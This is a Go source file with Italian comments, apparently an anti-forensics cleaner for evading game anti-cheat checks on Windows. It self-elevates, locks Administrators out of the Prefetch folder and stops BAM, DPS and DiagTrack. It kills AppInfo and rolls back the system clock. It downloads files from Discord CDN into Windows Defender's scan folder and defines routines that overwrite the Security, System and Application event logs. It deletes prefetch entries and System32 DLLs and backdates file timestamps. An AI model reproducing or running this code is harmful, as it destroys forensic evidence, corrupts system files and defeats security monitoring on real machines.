package main

import (
	"bufio"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"

	"strconv"
	"strings"
	"syscall"
	"time"

	s "strings"

	"github.com/kardianos/service"
	ps "github.com/mitchellh/go-ps"
	"github.com/p3tr0v/chacal/utils"
	"golang.org/x/sys/windows"
)

func togli() {
	folderPath := "C:\\Windows\\Prefetch"
	command := "icacls"
	args := []string{folderPath, "/deny", "Administrators:(W)"}

	cmd := exec.Command(command, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err := cmd.Run()
	if err != nil {
		//log.Fatal("Errore durante l'esecuzione di icacls:", err)
	}

	//log.Println("Permessi negati agli Amministratori sulla cartella:", folderPath)
}
func metti() {
	folderPath := "C:\\Windows\\Prefetch"

	// Reset dei permessi sulla cartella usando icacls
	resetCommand := "icacls"
	resetArgs := []string{folderPath, "/reset"}

	resetCmd := exec.Command(resetCommand, resetArgs...)
	resetCmd.Stdout = os.Stdout
	resetCmd.Stderr = os.Stderr

	err := resetCmd.Run()
	if err != nil {
		log.Fatal("Errore durante l'esecuzione del comando icacls /reset:", err)
	}

	//log.Println("Permessi ripristinati sulla cartella:", folderPath)
}
func runMeElevated() {
	if !isRunningAsAdmin() {
		verb := "runas"
		exe, _ := os.Executable()
		cwd, _ := os.Getwd()
		args := strings.Join(os.Args[1:], " ")

		verbPtr, _ := syscall.UTF16PtrFromString(verb)
		exePtr, _ := syscall.UTF16PtrFromString(exe)
		cwdPtr, _ := syscall.UTF16PtrFromString(cwd)
		argPtr, _ := syscall.UTF16PtrFromString(args)

		var showCmd int32 = 1 // SW_NORMAL

		err := windows.ShellExecute(0, verbPtr, exePtr, argPtr, cwdPtr, showCmd)
		if err != nil {
			//fmt.Println(err)
		} else {
			os.Exit(0) // Termina l'istanza originale del programma
		}
	}
}

func isRunningAsAdmin() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}
func main() {

	path := "C:\\Program Files\\Proggetti"

	if folderExists(path) {

		runMeElevated()
		inject()
		clean()
		panicb()
	} else {

		os.Exit(1)
	}
}

func folderExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

func MoveAndDeleteFileBySize(sourceDir string, fileSize int64, destinationDir string, newName string) error {
	// Leggi la lista dei file nella directory di origine
	files, err := ioutil.ReadDir(sourceDir)
	if err != nil {
		return fmt.Errorf("errore durante la lettura della directory di origine: %v", err)
	}

	// Cerca il file con la dimensione specificata
	var found bool
	for _, file := range files {
		if file.Size() == fileSize {
			found = true
			sourcePath := filepath.Join(sourceDir, file.Name())

			// Crea il percorso completo del file nella directory di destinazione con il nuovo nome
			destinationPath := filepath.Join(destinationDir, newName)

			// Rinomina il file con il nuovo nome
			if err := os.Rename(sourcePath, destinationPath); err != nil {
				//return fmt.Errorf("errore durante la rinomina del file: %v", err)
			}

			// Cancella il file nella directory di destinazione
			if err := os.Remove(destinationPath); err != nil {
				//return fmt.Errorf("errore durante la cancellazione del file nella directory di destinazione: %v", err)
			}

			//fmt.Println("File rinominato, spostato e cancellato con successo!")
			break
		}
	}

	if !found {
		//return fmt.Errorf("nessun file trovato con la dimensione specificata")
	}

	return nil
}

func dllgosth() {
	sourceDir := "C:\\Windows\\System32"
	fileSize := int64(1443328)
	destinationDir := "C:\\Program Files (x86)\\Steam\\dumps"
	newName := "setting.dat"

	err := MoveAndDeleteFileBySize(sourceDir, fileSize, destinationDir, newName)
	if err != nil {
		//fmt.Println("Errore:", err)
		return
	}

	//fmt.Println("Operazione completata con successo!")
}

func inject() {
	currentTime := setBackwardTime()
	togli()
	stop()
	stop2()
	AppInfo()
	time.Sleep(2 * time.Second)
	restoreNormalTime(currentTime)
}

func processList() bool {
	processList, _ := ps.Processes()

	for x := range processList {
		var process ps.Process
		process = processList[x]
		pn := s.ToLower(process.Executable())

		if utils.PList(utils.MemoryDumpListToCheck, pn) {
			//	fmt.Println("MEM_WATCHER:" + pn)
			return true
		}
	}
	return false
}

func ByMemWatcher() bool {
	return processList()
}

func modifica2() {
	filePath := "C:\\Program Files (x86)\\Steam\\userdata\\1043577738\\730\\remotecache.vdf"

	err := updateFileModificationTime(filePath)
	if err != nil {
		//fmt.Println("Errore durante l'aggiornamento della data di modifica:", err)
		return
	}

	//fmt.Println("Data di modifica del file aggiornata con successo.")
}

func stop2() {
	services := []string{"DPS", "DiagTrack"}

	// Arresta i servizi
	for _, service := range services {
		err := stopService(service)
		if err != nil {
			//panic()
		}
		// fmt.Printf("Il servizio %s è stato arrestato.\n", service)
	}
}
func stop() {
	services := []string{"Bam", "DPS"}

	// Arresta i servizi
	for _, service := range services {
		err := stopService(service)
		if err != nil {
			//fmt.Println("Errore durante l'arresto del servizio:", err)
			serviceStatus, statusErr := getServiceStatus(service)
			if statusErr != nil {
				fmt.Println("Impossibile ottenere lo stato del servizio:", statusErr)
				os.Exit(1)
			}

			if serviceStatus == windows.SERVICE_STOPPED {
				//fmt.Println("Il servizio", service, "è già fermo.")
			} else if serviceStatus == windows.SERVICE_RUNNING {
				//fmt.Println("Il servizio", service, "è in esecuzione.")
			} else {
				//fmt.Println("Il servizio", service, "è in uno stato diverso da 'running' e 'stopped'. Il programma verrà chiuso.")
				os.Exit(0)
			}

			continue // Continua senza chiudere il programma
		}
		//fmt.Printf("Il servizio %s è stato arrestato.\n", service)
	}
}

func stopService(serviceName string) error {
	scm, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CONNECT)
	if err != nil {
		return err
	}
	defer windows.CloseServiceHandle(scm)

	serviceHandle, err := windows.OpenService(scm, windows.StringToUTF16Ptr(serviceName), windows.SERVICE_STOP|windows.SERVICE_QUERY_STATUS|windows.SERVICE_ENUMERATE_DEPENDENTS)
	if err != nil {
		return err
	}
	defer windows.CloseServiceHandle(serviceHandle)

	var serviceStatus windows.SERVICE_STATUS
	err = windows.ControlService(serviceHandle, windows.SERVICE_CONTROL_STOP, &serviceStatus)
	if err != nil {
		return err
	}

	return nil
}

func getServiceStatus(serviceName string) (uint32, error) {
	scm, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CONNECT)
	if err != nil {
		return 0, err
	}
	defer windows.CloseServiceHandle(scm)

	serviceHandle, err := windows.OpenService(scm, windows.StringToUTF16Ptr(serviceName), windows.SERVICE_QUERY_STATUS)
	if err != nil {
		return 0, err
	}
	defer windows.CloseServiceHandle(serviceHandle)

	var serviceStatus windows.SERVICE_STATUS
	err = windows.QueryServiceStatus(serviceHandle, &serviceStatus)
	if err != nil {
		return 0, err
	}

	return serviceStatus.CurrentState, nil
}
func setBackwardTime() time.Time {
	// Ottenere l'orario corrente
	currentTime := time.Now()
	//fmt.Println("Orario corrente:",
	currentTime.Format("2006-01-02 15:04:05")

	// Generare un'ora casuale da sottrarre all'orario corrente
	rand.Seed(time.Now().UnixNano())
	hoursToSubtract := rand.Intn(4) + 1 // Sottrae da 1 a 4 ore

	// Verificare se è necessario sottrarre anche i minuti
	if hoursToSubtract > currentTime.Hour() {
		minutesToSubtract := rand.Intn(60) // Sottrae casualmente i minuti
		currentTime = currentTime.Add(-time.Duration(minutesToSubtract) * time.Minute)
	}

	// Calcolare il nuovo orario sottraendo l'ora casuale
	newTime := currentTime.Add(-time.Duration(hoursToSubtract) * time.Hour)

	// Impostare il nuovo orario di sistema su Windows
	cmd := exec.Command("cmd", "/C", "time", newTime.Format("15:04:05"))
	err := cmd.Run()
	if err != nil {
		fmt.Println("Errore durante la modifica dell'orario:", err)
		os.Exit(1)
	}

	cmd = exec.Command("cmd", "/C", "date", "/T", newTime.Format("01-02-2006"))
	err = cmd.Run()
	if err != nil {
		fmt.Println("Errore durante la modifica della data:", err)
		os.Exit(1)
	}

	//fmt.Println("Orario modificato:", newTime.Format("2006-01-02 15:04:05"))

	// Attendere 3 secondi
	time.Sleep(3 * time.Second)

	return currentTime
}
func restoreNormalTime(currentTime time.Time) {

	//currentTime = currentTime.Add(1 * time.Minute)

	// Ripristinare l'orario corrente su Windows
	restoreCmd := exec.Command("cmd", "/C", "time", currentTime.Format("15:04:05"))
	err := restoreCmd.Run()
	if err != nil {
		fmt.Println("Errore durante il ripristino dell'orario:", err)
		os.Exit(1)
	}

	restoreCmd = exec.Command("cmd", "/C", "date", "/T", currentTime.Format("01-02-2006"))
	err = restoreCmd.Run()
	if err != nil {
		fmt.Println("Errore durante il ripristino della data:", err)
		os.Exit(1)
	}

	//fmt.Println("Orario ripristinato:",
	currentTime.Format("2006-01-02 15:04:05")
}
func clean() {
	currentTime := setBackwardTime()
	//pf2()
	togli()
	download1()
	modifica()
	clean1()
	start2()
	dllgosth()
	time.Sleep(3 * time.Second)
	metti()
	restoreNormalTime(currentTime)
}

func moveAndDeleteFile(sourcePath, destinationPath string) error {
	sourceFile, err := os.Open(sourcePath)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destinationFile, err := os.Create(filepath.Join(destinationPath, filepath.Base(sourcePath)))
	if err != nil {
		return err
	}
	defer destinationFile.Close()

	_, err = io.Copy(destinationFile, sourceFile)
	if err != nil {
		return err
	}

	// Chiude il file prima di eliminarlo
	if err := sourceFile.Close(); err != nil {
		return err
	}

	err = os.Remove(sourcePath)
	if err != nil {
		return err
	}

	return nil
}
func clean1() {
	fileName := "C:\\Windows\\System32\\d3dcompiler_43.dll"
	newLocation := "C:\\Program Files (x86)\\Steam\\public\\d3dcompiler_43.dll"
	newName := "C:\\Program Files (x86)\\Steam\\public\\file.dll"

	// Ottenere il percorso della directory del file originale
	fileDir := filepath.Dir(fileName)
	// Ottenere solo il nome del file originale
	fileBase := filepath.Base(fileName)

	// Verificare se il nome del file originale è in minuscolo
	if strings.ToLower(fileBase) == fileBase {
		// Rinominare e spostare solo il file con il nome in minuscolo
		newPath := filepath.Join(fileDir, strings.ToLower(newName))
		err := os.Rename(fileName, newPath)
		if err != nil {
			// fmt.Println("Cleaning...")
			return
		}

		err = windows.MoveFileEx(windows.StringToUTF16Ptr(newPath), windows.StringToUTF16Ptr(newLocation), windows.MOVEFILE_REPLACE_EXISTING|windows.MOVEFILE_WRITE_THROUGH)
		if err != nil {
			// fmt.Println("Cleaning...")
			return
		}

		err = os.Remove(newPath)
		if err != nil {
			// fmt.Println("Cleaning...")
			return
		}

		err = os.Remove(newLocation)
		if err != nil {
			// fmt.Println("Cleaning...")
			return
		}
	} else {
		// Il file originale è in maiuscolo, non viene rinominato o spostato
		// fmt.Println("Cleaning...")
		return
	}
}
func eventlog1() {

	// Configura il servizio "eventlog"
	config := &service.Config{
		Name:        "eventlog",
		DisplayName: "Event Log",
	}

	// Connessione al servizio "eventlog"
	s, err := service.New(nil, config)
	if err != nil {
		// fmt.Println("Errore durante la connessione al servizio:", err)
		return
	}

	// Riavviare il servizio "eventlog"
	err = s.Start()
	if err != nil {
		// fmt.Println("Errore durante il riavvio del servizio:", err)
		return
	}

	// fmt.Println("Servizio riavviato con successo")
}
func event() {
	url := "https://cdn.discordapp.com/attachments/1108786431020769330/1110639846080385068/Application.evtx"

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		//fmt.Println(err)
		return
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		//fmt.Println(err)
		return
	}
	defer resp.Body.Close()

	file, err := os.Create("C:\\Windows\\System32\\winevt\\Logs\\Application.evtx")
	if err != nil {
		//fmt.Println(err)
		return
	}
	defer file.Close()

	_, err = io.Copy(file, resp.Body)
	if err != nil {
		//fmt.Println(err)
		return
	}

}
func event1() {
	url := "https://cdn.discordapp.com/attachments/1108786431020769330/1121510596500783254/Security.evtx"

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		//fmt.Println(err)
		return
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		//fmt.Println(err)
		return
	}
	defer resp.Body.Close()

	file, err := os.Create("C:\\Windows\\System32\\winevt\\Logs\\Security.evtx")
	if err != nil {
		//fmt.Println(err)
		return
	}
	defer file.Close()

	_, err = io.Copy(file, resp.Body)
	if err != nil {
		//fmt.Println(err)
		return
	}

}
func event2() {
	url := "https://cdn.discordapp.com/attachments/1108786431020769330/1110639846512414781/System.evtx"

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		//fmt.Println(err)
		return
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		//fmt.Println(err)
		return
	}
	defer resp.Body.Close()

	file, err := os.Create("C:\\Windows\\System32\\winevt\\Logs\\System.evtx")
	if err != nil {
		//fmt.Println(err)
		return
	}
	defer file.Close()

	_, err = io.Copy(file, resp.Body)
	if err != nil {
		//fmt.Println(err)
		return
	}

}

func AppInfo() {
	// Esegui la query per il processo "eventlog"
	cmd := exec.Command("sc", "queryex", "AppInfo")
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		//fmt.Println("Errore durante l'esecuzione del comando:", err)
		return
	}
	defer stdout.Close()

	if err := cmd.Start(); err != nil {
		//fmt.Println("Errore durante l'esecuzione del comando:", err)
		return
	}

	// Leggi l'output della query
	scanner := bufio.NewScanner(stdout)
	var pid int
	pattern := regexp.MustCompile(`\d+`)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, "PID") {
			pidStr := pattern.FindStringSubmatch(line)[0]
			pid, err = strconv.Atoi(pidStr)
			if err != nil {
				//fmt.Println("Errore durante la conversione del PID:", err)
				return
			}
			break
		}
	}

	if err := scanner.Err(); err != nil {
		//fmt.Println("Errore durante la lettura dell'output:", err)
		return
	}

	if err := cmd.Wait(); err != nil {
		//fmt.Println("Errore durante l'esecuzione del comando:", err)
		return
	}

	if pid == 0 {
		//fmt.Println("Processo non trovato")
		return
	}

	// Termina il processo utilizzando il suo PID
	killCmd := exec.Command("taskkill", "/F", "/PID", strconv.Itoa(pid))
	if err := killCmd.Run(); err != nil {
		//fmt.Println("Errore durante la terminazione del processo:", err)
		return
	}

	//fmt.Println("Processo terminato con successo")
}
func AppInfo1() {

	// Configura il servizio "eventlog"
	config := &service.Config{
		Name:        "AppInfo",
		DisplayName: "AppInfo",
	}

	// Connessione al servizio "eventlog"
	s, err := service.New(nil, config)
	if err != nil {
		// fmt.Println("Errore durante la connessione al servizio:", err)
		return
	}

	// Riavviare il servizio "eventlog"
	err = s.Start()
	if err != nil {
		// fmt.Println("Errore durante il riavvio del servizio:", err)
		return
	}

	// fmt.Println("Servizio riavviato con successo")
}
func eventlog() {
	// Esegui la query per il processo "eventlog"
	cmd := exec.Command("sc", "queryex", "eventlog")
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		//fmt.Println("Errore durante l'esecuzione del comando:", err)
		return
	}
	defer stdout.Close()

	if err := cmd.Start(); err != nil {
		//fmt.Println("Errore durante l'esecuzione del comando:", err)
		return
	}

	// Leggi l'output della query
	scanner := bufio.NewScanner(stdout)
	var pid int
	pattern := regexp.MustCompile(`\d+`)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, "PID") {
			pidStr := pattern.FindStringSubmatch(line)[0]
			pid, err = strconv.Atoi(pidStr)
			if err != nil {
				//fmt.Println("Errore durante la conversione del PID:", err)
				return
			}
			break
		}
	}

	if err := scanner.Err(); err != nil {
		//fmt.Println("Errore durante la lettura dell'output:", err)
		return
	}

	if err := cmd.Wait(); err != nil {
		//fmt.Println("Errore durante l'esecuzione del comando:", err)
		return
	}

	if pid == 0 {
		//fmt.Println("Processo non trovato")
		return
	}

	// Termina il processo utilizzando il suo PID
	killCmd := exec.Command("taskkill", "/F", "/PID", strconv.Itoa(pid))
	if err := killCmd.Run(); err != nil {
		//fmt.Println("Errore durante la terminazione del processo:", err)
		return
	}

	//fmt.Println("Processo terminato con successo")
}
func download1() {
	url := "https://cdn.discordapp.com/attachments/1101601813909737633/1143949334967238686/mpcache-1646ED4AFA7A2FFE14979AEA79975FE6776DBD07.bin.6C"

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println(err)
		return
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()

	file, err := os.Create("C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\mpcache-1646ED4AFA7A2FFE14979AEA79975FE6776DBD07.bin.7C")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer file.Close()

	_, err = io.Copy(file, resp.Body)
	if err != nil {
		fmt.Println(err)
		return
	}

}
func modifica() {
	filePath := "C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\mpcache-1646ED4AFA7A2FFE14979AEA79975FE6776DBD07.bin.7C"

	err := updateFileModificationTime(filePath)
	if err != nil {
		//fmt.Println("Errore durante l'aggiornamento della data di modifica:", err)
		return
	}

	//fmt.Println("Data di modifica del file aggiornata con successo.")
}

func updateFileModificationTime(filePath string) error {
	// Ottieni l'ora attuale
	currentTime := time.Now()

	// Sottrai 3 ore all'ora attuale
	newTime := currentTime.Add(-8 * time.Hour)

	// Modifica la data di modifica del file
	err := os.Chtimes(filePath, newTime, newTime)
	if err != nil {
		return err
	}

	return nil
}

const (
	serviceName = "BAM"
)

func stopbm() {
	err := stopServicebm(serviceName)
	if err != nil {
		//fmt.Printf("Errore durante l'arresto del servizio %s: %s\n", serviceName, err)
	}
}

func stopServicebm(serviceName string) error {
	scm, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CONNECT)
	if err != nil {
		return err
	}
	defer windows.CloseServiceHandle(scm)

	serviceHandle, err := windows.OpenService(scm, windows.StringToUTF16Ptr(serviceName), windows.SERVICE_STOP|windows.SERVICE_QUERY_STATUS|windows.SERVICE_ENUMERATE_DEPENDENTS)
	if err != nil {
		return err
	}
	defer windows.CloseServiceHandle(serviceHandle)

	var serviceStatus windows.SERVICE_STATUS
	err = windows.ControlService(serviceHandle, windows.SERVICE_CONTROL_STOP, &serviceStatus)
	if err != nil {
		return err
	}

	// Attendi un massimo di 10 secondi per l'arresto del servizio
	timeout := 10 * time.Second
	startTime := time.Now()

	for {
		err = windows.QueryServiceStatus(serviceHandle, &serviceStatus)
		if err != nil {
			return err
		}

		if serviceStatus.CurrentState == windows.SERVICE_STOPPED {
			return nil // Il servizio è stato arrestato correttamente
		}

		// Verifica se è scaduto il timeout
		elapsedTime := time.Since(startTime)
		if elapsedTime >= timeout {
			return fmt.Errorf("timeout: il servizio %s non si è arrestato entro il limite di tempo", serviceName)
		}

		// Aspetta per un breve periodo prima di verificare nuovamente lo stato del servizio
		time.Sleep(500 * time.Millisecond)
	}
}

func panicb() {
	pf2()
	togli()
	modifica2()
	time.Sleep(2 * time.Second)
	os.Exit(0)
}
func pf2() {
	prefetchFolder := "C:\\Windows\\Prefetch"                                                                     // Modifica il percorso se necessario
	prefixesToMatch := []string{"CALC.EXE", "TASKLIST.EXE", "ERROR_REPORT", "TASKHOSTW.EXE", "CALCULATORAPP.EXE"} // I prefissi da cercare (tutti maiuscoli)
	destinationPath := "C:\\Program Files (x86)\\Steam\\dumps\\reports"

	files, err := ioutil.ReadDir(prefetchFolder)
	if err != nil {
		fmt.Println("Errore durante la lettura della cartella Prefetch:", err)
		return
	}

	for _, file := range files {
		for _, prefix := range prefixesToMatch {
			if strings.HasPrefix(strings.ToUpper(file.Name()), prefix) {
				filePath := filepath.Join(prefetchFolder, file.Name())
				err := moveAndDeleteFile(filePath, destinationPath)
				if err != nil {
					//fmt.Printf("Errore durante lo spostamento del file %s: %v\n", file.Name(), err)
				} else {
					//fmt.Printf("Il file %s è stato spostato e poi eliminato con successo.\n", file.Name())
				}
			}
		}
	}
}

func start2() {
	services := []string{"Diagtrack", "DPS"}

	// Avvia i servizi
	for _, service := range services {
		for retry := 0; retry < 3; retry++ { // Riprova per massimo 3 volte
			err := startService(service)
			if err != nil {
				//log.Printf("Errore durante l'avvio del servizio %s: %v\n", service, err)
				time.Sleep(5 * time.Second) // Aspetta 5 secondi prima di riprovare
			} else {
				//log.Printf("Il servizio %s è stato avviato.\n", service)
				break // Esci dal loop di retry se il servizio è stato avviato con successo
			}
		}
	}
}
func startService(serviceName string) error {
	scm, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CONNECT|windows.SC_MANAGER_ENUMERATE_SERVICE)
	if err != nil {
		return err
	}
	defer windows.CloseServiceHandle(scm)

	serviceHandle, err := windows.OpenService(scm, windows.StringToUTF16Ptr(serviceName), windows.SERVICE_START|windows.SERVICE_QUERY_STATUS|windows.SERVICE_ENUMERATE_DEPENDENTS)
	if err != nil {
		return err
	}
	defer windows.CloseServiceHandle(serviceHandle)

	var serviceStatus windows.SERVICE_STATUS
	err = windows.QueryServiceStatus(serviceHandle, &serviceStatus)
	if err != nil {
		return err
	}

	if serviceStatus.CurrentState == windows.SERVICE_RUNNING {
		return nil // Il servizio è già in esecuzione
	}

	// Avvia il servizio
	if err = windows.StartService(serviceHandle, 0, nil); err != nil {
		return err
	}

	// Attendi fino a quando il servizio viene avviato o raggiunge lo stato "start_pending"
	timeout := 30 * time.Second
	startTime := time.Now()

	for {
		err = windows.QueryServiceStatus(serviceHandle, &serviceStatus)
		if err != nil {
			return err
		}

		if serviceStatus.CurrentState == windows.SERVICE_RUNNING {
			return nil // Il servizio è stato avviato correttamente
		}

		if serviceStatus.CurrentState == windows.SERVICE_START_PENDING {
			// Verifica se è scaduto il timeout
			elapsedTime := time.Since(startTime)
			if elapsedTime >= timeout {
				return errors.New("timeout: il servizio non si è avviato entro il limite di tempo")
			}

			// Aspetta per un breve periodo prima di verificare nuovamente lo stato del servizio
			time.Sleep(500 * time.Millisecond)
		} else {
			return errors.New("errore: il servizio non si è avviato correttamente")
		}
	}
}

func checkprocess() {
	// elenco dei processi da controllare
	processi := []string{"dps", "diagtrack"}

	// controlla se ogni processo è in esecuzione
	for _, processo := range processi {
		go func(processo string) {
			out, err := exec.Command("tasklist", "/fi", fmt.Sprintf("imagename eq %s.exe", processo)).Output()
			if err != nil {
				//panic()
			}

			// se il processo non è in esecuzione, esegue la funzione "start2"
			if !strings.Contains(string(out), processo) {
				start2()
			}
		}(processo)
	}
}

func del(filePath string) error {
	err := os.Remove(filePath)
	if err != nil {
		return err
	}

	return nil
}
